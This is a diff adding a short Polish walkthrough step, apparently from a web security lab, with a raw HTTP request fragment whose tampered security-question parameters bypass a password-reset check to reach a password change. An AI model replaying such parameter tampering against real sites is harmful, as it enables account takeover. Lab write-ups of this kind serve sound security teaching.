@@ -1,0 +1,5 @@
+2. Wystarczy zmodyfikować skrypt pytania zabezpieczającego, w ten sposób otrzymujemy zwrotnie możliwość zmiany hasła.
+Cookie: JSESSIONID=NHrj3nMRaJGPjKYyZSEDY4RZ25Jc-YnBcSklFHda
+Connection: close
+
+secQuestion10=dar&secQuestion11=ddd&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746
